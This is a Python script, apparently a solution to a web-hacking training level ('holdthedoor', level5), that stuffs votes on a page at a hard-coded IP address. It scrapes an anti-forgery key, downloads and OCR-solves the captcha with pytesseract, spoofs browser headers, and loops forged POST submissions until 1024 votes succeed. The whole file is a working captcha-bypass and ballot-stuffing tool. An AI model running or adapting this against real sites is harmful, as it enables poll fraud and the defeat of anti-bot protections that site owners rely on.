import requests
from bs4 import BeautifulSoup
import os
import pytesseract
from PIL import Image, ImageOps, ImageEnhance, ImageFilter

URL = "http://158.69.76.135/level5.php"
captcha_URL = 'http://158.69.76.135/tim.php'
payload = {"id": "1091", "holdthedoor": "holdthedoor: Submit+Query", "key": "", "captcha": ""}
headers = {
    "Host": "158.69.76.135",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
    "Accept": "text/html, application/xhtml+xml, application/xml",
    "Accept-Language": "en-US, en",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://158.69.76.135",
    "Connection": "keep-alive",
    "Referer": "http://158.69.76.135/level5.php"
}

def solve_captcha(path):

    """
    Convert a captcha image into a text, 
    using PyTesseract Python-wrapper for Tesseract
    Arguments:
        path (str):
            path to the image to be processed
    Return:
        'textualized' image
    """
    # Bring out the edges by sharpening.  
    img = Image.open(path)
    img = img.convert('RGB')
    pixel_data = img.load()

    for x in range(img.size[0]):
        for y in range(img.size[1]):
            if (pixel_data[x, y][0] < 10) \
                    and (pixel_data[x, y][1] < 10) \
                    and (pixel_data[x, y][2] < 10):
                pixel_data[x, y] = (0x80, 0x80, 0x80, 255)

    filename = "{}.png".format(path)
    img.save(filename)

    text = pytesseract.image_to_string(Image.open(filename))
    return text

s = requests.Session()
s.headers.update(headers)
votes = 0
while votes < 1024:
    response = s.get(URL)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, "html.parser")
        key = soup.find("input", {'name': "key"}).attrs['value']
        payload["key"] = key
        print("[GET]: The request has succeeded, key = {:s}.".format(key))
        response = s.get(captcha_URL)
        f = open('captcha.png', 'wb')
        f.write(response.content)
        f.close()
        payload["captcha"] = solve_captcha("captcha.png")
        print('-- Captcha Resolving Result: {}'.format(payload["captcha"]))
    else:
        print("[GET]: The request has fail : {:s}.".format(URL))
    response = s.post(URL, data=payload)
    if response.status_code == 200:
        print("[POST] The request has succeeded.".format(votes))
    else:
        print("[POST] The request has fail.".format(votes))
    if response.text != "See you later hacker! [11]":
        votes += 1
        print("Votes : {:d}".format(votes))
    else:
          print("Vote fail.")
